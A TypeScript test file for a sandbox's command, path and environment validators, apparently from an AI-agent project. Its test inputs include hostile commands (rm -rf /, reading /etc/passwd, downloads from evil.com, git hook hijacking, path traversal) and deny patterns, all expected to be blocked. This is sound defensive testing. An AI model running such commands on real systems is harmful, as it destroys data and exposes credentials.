import { describe, expect, test } from 'bun:test';
import type { SandboxConfig } from '@personalclaw/shared';
import {
  buildSandboxEnv,
  SAFE_ENV_VARS,
  SandboxCommandValidator,
  validateGitTokenEnvVar,
  validateSandboxPath,
} from '../security';

const baseConfig: SandboxConfig = {
  allowedCommands: ['git', 'ls', 'cat', 'echo', 'python3', 'node', 'find', 'pip', 'curl', 'bun'],
  deniedPatterns: ['\\brm\\s+(-\\w+\\s+)*\\/', '\\bmkfs\\b', '\\bdd\\b.*\\bif='],
  maxExecutionTimeS: 60,
  maxWorkspaceSizeMb: 256,
  networkAccess: true,
  gitTokenEnvVar: null,
};

describe('SandboxCommandValidator', () => {
  const validator = new SandboxCommandValidator(baseConfig);

  describe('allowed commands', () => {
    test('allows listed commands', () => {
      expect(validator.validateCommand('ls -la')).toEqual({ valid: true });
      expect(validator.validateCommand('git status')).toEqual({ valid: true });
      expect(validator.validateCommand('cat file.txt')).toEqual({ valid: true });
      expect(validator.validateCommand('echo hello')).toEqual({ valid: true });
    });

    test('allows commands with arguments', () => {
      expect(validator.validateCommand('git clone https://github.com/org/repo.git')).toEqual({
        valid: true,
      });
    });

    test('blocks unlisted commands', () => {
      const result = validator.validateCommand('wget http://evil.com');
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.reason).toContain('wget');
        expect(result.reason).toContain('not in the allowed list');
      }
    });
  });

  describe('shell metacharacters', () => {
    test('blocks semicolons', () => {
      const result = validator.validateCommand('ls; rm -rf /');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('metacharacters');
    });

    test('blocks pipes', () => {
      const result = validator.validateCommand('cat file | grep secret');
      expect(result.valid).toBe(false);
    });

    test('blocks ampersands', () => {
      const result = validator.validateCommand('ls & cat /etc/passwd');
      expect(result.valid).toBe(false);
    });

    test('blocks backticks', () => {
      const result = validator.validateCommand('echo `whoami`');
      expect(result.valid).toBe(false);
    });

    test('blocks dollar signs', () => {
      const result = validator.validateCommand('echo $HOME');
      expect(result.valid).toBe(false);
    });

    test('blocks command substitution', () => {
      const result = validator.validateCommand('echo $(id)');
      expect(result.valid).toBe(false);
    });
  });

  describe('denied patterns', () => {
    test('blocks rm -rf /', () => {
      // Use a config that includes rm to test denied patterns specifically
      const rmConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
      };
      const rmValidator = new SandboxCommandValidator(rmConfig);
      const result = rmValidator.validateCommand('rm -rf /');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('denied pattern');
    });

    test('blocks rm -r -f / (flag reordering)', () => {
      const rmConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
      };
      const rmValidator = new SandboxCommandValidator(rmConfig);
      const result = rmValidator.validateCommand('rm -r -f /');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('denied pattern');
    });

    test('blocks rm -rf /*', () => {
      const rmConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
      };
      const rmValidator = new SandboxCommandValidator(rmConfig);
      const result = rmValidator.validateCommand('rm -rf /*');
      expect(result.valid).toBe(false);
    });

    test('blocks rm -fr /', () => {
      const rmConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
      };
      const rmValidator = new SandboxCommandValidator(rmConfig);
      const result = rmValidator.validateCommand('rm -fr /');
      expect(result.valid).toBe(false);
    });

    test('allows rm file.txt (not matching denied pattern)', () => {
      const rmConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'rm'],
      };
      const rmValidator = new SandboxCommandValidator(rmConfig);
      const result = rmValidator.validateCommand('rm file.txt');
      expect(result.valid).toBe(true);
    });

    test('blocks mkfs', () => {
      const mkfsConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'mkfs.ext4'],
      };
      const mkfsValidator = new SandboxCommandValidator(mkfsConfig);
      const result = mkfsValidator.validateCommand('mkfs.ext4 /dev/sda1');
      expect(result.valid).toBe(false);
    });
  });

  describe('edge cases', () => {
    test('rejects empty commands', () => {
      const result = validator.validateCommand('');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toBe('Empty command');
    });

    test('rejects whitespace-only commands', () => {
      const result = validator.validateCommand('   ');
      expect(result.valid).toBe(false);
    });

    test('handles commands with paths', () => {
      expect(validator.validateCommand('/usr/bin/git status')).toEqual({ valid: true });
    });
  });

  describe('shell binary rejection', () => {
    test('rejects bash (not in default allowlist)', () => {
      const result = validator.validateCommand('bash -c "dangerous"');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('not in the allowed list');
    });

    test('rejects sh (not in default allowlist)', () => {
      const result = validator.validateCommand('sh -c "dangerous"');
      expect(result.valid).toBe(false);
    });

    test('rejects /bin/bash with full path', () => {
      const result = validator.validateCommand('/bin/bash -c "dangerous"');
      expect(result.valid).toBe(false);
    });
  });

  describe('shell interpreter warning', () => {
    test('emits warning when bash is in custom allowlist', () => {
      // The warning is logged in the constructor; this test verifies construction succeeds.
      const warnConfig: SandboxConfig = {
        ...baseConfig,
        allowedCommands: [...baseConfig.allowedCommands, 'bash'],
      };
      const warnValidator = new SandboxCommandValidator(warnConfig);
      // bash -c is allowed here only because an admin explicitly added bash to the allowlist.
      const result = warnValidator.validateCommand('bash -c "test"');
      expect(result.valid).toBe(true);
    });
  });

  describe('backward compatibility', () => {
    test('allows ls -la', () => {
      expect(validator.validateCommand('ls -la')).toEqual({ valid: true });
    });

    test('allows git status', () => {
      expect(validator.validateCommand('git status')).toEqual({ valid: true });
    });

    test('allows cat file.txt', () => {
      expect(validator.validateCommand('cat file.txt')).toEqual({ valid: true });
    });

    test('allows echo hello', () => {
      expect(validator.validateCommand('echo hello')).toEqual({ valid: true });
    });

    test('allows node script.js', () => {
      expect(validator.validateCommand('node script.js')).toEqual({ valid: true });
    });

    test('allows python3 script.py', () => {
      expect(validator.validateCommand('python3 script.py')).toEqual({ valid: true });
    });

    test('allows git clone url', () => {
      expect(validator.validateCommand('git clone https://github.com/org/repo.git')).toEqual({
        valid: true,
      });
    });
  });

  describe('newline and null byte bypass', () => {
    test('rejects commands with newline', () => {
      const result = validator.validateCommand('ls\ncat /etc/passwd');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('metacharacters');
    });

    test('rejects commands with carriage return', () => {
      const result = validator.validateCommand('ls\rcat /etc/passwd');
      expect(result.valid).toBe(false);
    });

    test('rejects commands with null byte', () => {
      const result = validator.validateCommand('ls\0cat /etc/passwd');
      expect(result.valid).toBe(false);
    });
  });

  describe('eval flags allowed (sandbox is the security boundary)', () => {
    test('allows node -e (sandbox provides isolation)', () => {
      expect(validator.validateCommand('node -e "code"')).toEqual({ valid: true });
    });

    test('allows python3 -c (sandbox provides isolation)', () => {
      expect(validator.validateCommand('python3 -c "code"')).toEqual({ valid: true });
    });

    test('allows bun -e (sandbox provides isolation)', () => {
      expect(validator.validateCommand('bun -e "code"')).toEqual({ valid: true });
    });

    test('allows node --eval=code', () => {
      expect(validator.validateCommand('node --eval=code')).toEqual({ valid: true });
    });

    test('allows node script.js', () => {
      expect(validator.validateCommand('node script.js')).toEqual({ valid: true });
    });

    test('allows python3 script.py', () => {
      expect(validator.validateCommand('python3 script.py')).toEqual({ valid: true });
    });
  });

  describe('per-binary dangerous args (destructive only)', () => {
    test('allows find -exec (sandbox limits blast radius)', () => {
      expect(validator.validateCommand('find . -exec grep TODO {}')).toEqual({ valid: true });
    });

    test('allows find -execdir (sandbox limits blast radius)', () => {
      expect(validator.validateCommand('find . -execdir chmod 644 {}')).toEqual({ valid: true });
    });

    test('blocks find -delete (destructive mass deletion)', () => {
      const result = validator.validateCommand('find . -delete');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('deletion');
    });

    test('allows find -name', () => {
      expect(validator.validateCommand('find . -name "*.ts"')).toEqual({ valid: true });
    });

    test('blocks find "-delete" with quoted arg (quoting bypass)', () => {
      const result = validator.validateCommand('find . "-delete"');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('deletion');
    });

    test('blocks git -c core.hooksPath (stealth code execution)', () => {
      const result = validator.validateCommand('git -c core.hooksPath=/evil pull');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('hooks');
    });

    test('blocks git -c core.sshCommand (stealth code execution)', () => {
      const result = validator.validateCommand('git -c core.sshCommand=evil fetch');
      expect(result.valid).toBe(false);
    });

    test('blocks git -ccore.hooksPath concatenated form', () => {
      const result = validator.validateCommand('git -ccore.hooksPath=/evil pull');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('hooks');
    });

    test('allows git clone', () => {
      expect(validator.validateCommand('git clone https://example.com/repo.git')).toEqual({
        valid: true,
      });
    });

    test('allows git status', () => {
      expect(validator.validateCommand('git status')).toEqual({ valid: true });
    });

    test('allows pip install from PyPI (normal workflow)', () => {
      expect(validator.validateCommand('pip install flask')).toEqual({ valid: true });
    });

    test('allows pip install with version pin', () => {
      expect(validator.validateCommand('pip install requests==2.31.0')).toEqual({ valid: true });
    });

    test('blocks pip install from URL (untrusted source)', () => {
      const result = validator.validateCommand('pip install https://evil.com/pkg.tar.gz');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('URL');
    });

    test('blocks pip install from VCS URL (git+https://)', () => {
      const result = validator.validateCommand('pip install git+https://github.com/evil/pkg.git');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('URL');
    });

    test('blocks pip install from absolute path outside workspace', () => {
      const result = validator.validateCommand('pip install /tmp/evil-pkg');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('outside the workspace');
    });

    test('allows pip install from workspace path', () => {
      expect(validator.validateCommand('pip install ./')).toEqual({ valid: true });
    });

    test('allows pip --version', () => {
      expect(validator.validateCommand('pip --version')).toEqual({ valid: true });
    });

    test('blocks curl -o to absolute path outside workspace', () => {
      const result = validator.validateCommand('curl -o /usr/bin/payload https://evil.com');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('workspace');
    });

    test('blocks curl --output= to absolute path outside workspace', () => {
      const result = validator.validateCommand('curl --output=/usr/bin/payload https://evil.com');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('workspace');
    });

    test('allows curl without -o', () => {
      expect(validator.validateCommand('curl https://api.example.com')).toEqual({ valid: true });
    });

    test('destructive arg rejection includes alternative suggestion', () => {
      const result = validator.validateCommand('find . -delete');
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('instead');
    });
  });
});

describe('validateSandboxPath', () => {
  const workspace = '/tmp/sandbox-123/workspace';

  test('allows simple relative paths', () => {
    expect(validateSandboxPath('file.txt', workspace)).toEqual({ valid: true });
    expect(validateSandboxPath('src/main.py', workspace)).toEqual({ valid: true });
    expect(validateSandboxPath('a/b/c/d.ts', workspace)).toEqual({ valid: true });
  });

  test('rejects empty paths', () => {
    const result = validateSandboxPath('', workspace);
    expect(result.valid).toBe(false);
    if (!result.valid) expect(result.reason).toBe('Empty path');
  });

  test('rejects absolute paths', () => {
    const result = validateSandboxPath('/etc/passwd', workspace);
    expect(result.valid).toBe(false);
    if (!result.valid) expect(result.reason).toContain('Absolute paths');
  });

  test('rejects directory traversal with ..', () => {
    const result = validateSandboxPath('../../../etc/passwd', workspace);
    expect(result.valid).toBe(false);
    if (!result.valid) expect(result.reason).toContain('traversal');
  });

  test('rejects sneaky traversal mid-path', () => {
    const result = validateSandboxPath('foo/../../etc/passwd', workspace);
    expect(result.valid).toBe(false);
  });

  test('allows dot-prefixed filenames', () => {
    expect(validateSandboxPath('.gitignore', workspace)).toEqual({ valid: true });
    expect(validateSandboxPath('.env', workspace)).toEqual({ valid: true });
  });

  test('allows current directory references', () => {
    expect(validateSandboxPath('./file.txt', workspace)).toEqual({ valid: true });
  });
});

describe('buildSandboxEnv', () => {
  test('returns only allowlisted host vars when no extras provided', () => {
    const env = buildSandboxEnv();
    const keys = Object.keys(env);
    for (const key of keys) {
      expect(SAFE_ENV_VARS).toContain(key);
    }
  });

  test('includes provider envVars and caller options.env alongside allowlisted vars', () => {
    const env = buildSandboxEnv({ PROVIDER_VAR: 'prov' }, { CALLER_VAR: 'call' });
    expect(env.PROVIDER_VAR).toBe('prov');
    expect(env.CALLER_VAR).toBe('call');
  });

  test('allows options.env to override allowlisted values', () => {
    const env = buildSandboxEnv(undefined, { PATH: '/custom/path' });
    expect(env.PATH).toBe('/custom/path');
  });

  test('excludes sensitive vars even when set on host', () => {
    const originalDb = Bun.env.DATABASE_URL;
    const originalOpenai = Bun.env.OPENAI_API_KEY;
    const originalAws = Bun.env.AWS_SECRET_ACCESS_KEY;
    Bun.env.DATABASE_URL = 'postgres://secret';
    Bun.env.OPENAI_API_KEY = 'sk-secret';
    Bun.env.AWS_SECRET_ACCESS_KEY = 'aws-secret';

    try {
      const env = buildSandboxEnv();
      expect(env.DATABASE_URL).toBeUndefined();
      expect(env.OPENAI_API_KEY).toBeUndefined();
      expect(env.AWS_SECRET_ACCESS_KEY).toBeUndefined();
    } finally {
      if (originalDb === undefined) delete Bun.env.DATABASE_URL;
      else Bun.env.DATABASE_URL = originalDb;
      if (originalOpenai === undefined) delete Bun.env.OPENAI_API_KEY;
      else Bun.env.OPENAI_API_KEY = originalOpenai;
      if (originalAws === undefined) delete Bun.env.AWS_SECRET_ACCESS_KEY;
      else Bun.env.AWS_SECRET_ACCESS_KEY = originalAws;
    }
  });

  test('handles missing allowlisted vars gracefully', () => {
    const originalLang = Bun.env.LANG;
    delete Bun.env.LANG;

    try {
      const env = buildSandboxEnv();
      expect(env.LANG).toBeUndefined();
    } finally {
      if (originalLang !== undefined) Bun.env.LANG = originalLang;
    }
  });

  test('allows provider envVars to override allowlisted values when they collide', () => {
    const env = buildSandboxEnv({ PATH: '/provider/path' });
    expect(env.PATH).toBe('/provider/path');
  });
});

describe('validateGitTokenEnvVar', () => {
  test('accepts allowed token variable names', () => {
    expect(() => validateGitTokenEnvVar('GH_TOKEN')).not.toThrow();
    expect(() => validateGitTokenEnvVar('GITHUB_TOKEN')).not.toThrow();
    expect(() => validateGitTokenEnvVar('GIT_TOKEN')).not.toThrow();
    expect(() => validateGitTokenEnvVar('GITLAB_TOKEN')).not.toThrow();
  });

  test('throws for disallowed variable names', () => {
    expect(() => validateGitTokenEnvVar('DATABASE_URL')).toThrow('not allowed');
    expect(() => validateGitTokenEnvVar('AWS_SECRET_ACCESS_KEY')).toThrow('not allowed');
    expect(() => validateGitTokenEnvVar('SOME_RANDOM_VAR')).toThrow('not allowed');
  });

  test('accepts null and empty string as no-op', () => {
    expect(() => validateGitTokenEnvVar(null)).not.toThrow();
    expect(() => validateGitTokenEnvVar('')).not.toThrow();
    expect(() => validateGitTokenEnvVar(undefined)).not.toThrow();
  });
});

describe('buildSandboxEnv determinism', () => {
  test('produces deterministic output for identical inputs (SC-004)', () => {
    const envA = buildSandboxEnv({ GH_TOKEN: 'token123' }, { CUSTOM: 'val' });
    const envB = buildSandboxEnv({ GH_TOKEN: 'token123' }, { CUSTOM: 'val' });
    expect(envA).toEqual(envB);
  });
});
